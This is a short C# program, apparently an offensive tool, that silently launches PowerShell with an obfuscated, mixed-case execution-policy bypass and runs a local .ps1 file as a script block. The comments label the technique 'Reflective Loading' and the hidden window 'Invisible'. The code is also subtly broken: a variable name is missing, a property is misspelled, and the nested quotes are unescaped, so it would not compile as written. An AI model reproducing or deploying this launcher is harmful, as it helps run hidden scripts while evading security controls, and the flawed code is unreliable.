using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: AssemblyVersion("0.0.0.0")]
internal class Program
{
	private static void Main()
	{
		ProcessStartInfo = new ProcessStartInfo();
		processStartInfo.Filename = "powershell.exe";
		processStartInfo.Arguments = "-eXEcUTiOnPolICY bYpaSs INvoKE-COmmand -SCrIPtBlOcK ([ScRIptblOck]::CrEATe((Get-CONteNt -Path "C:<File>.ps1>" -Raw)))";
		//Uses powershell Reflective Loading 
		processStartInfo.UseShellExecute = false; //direct Create Process
		processStartInfo.CreateNoWindow = true; //Invisible
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error " + ex.Message);
		}
	}
}
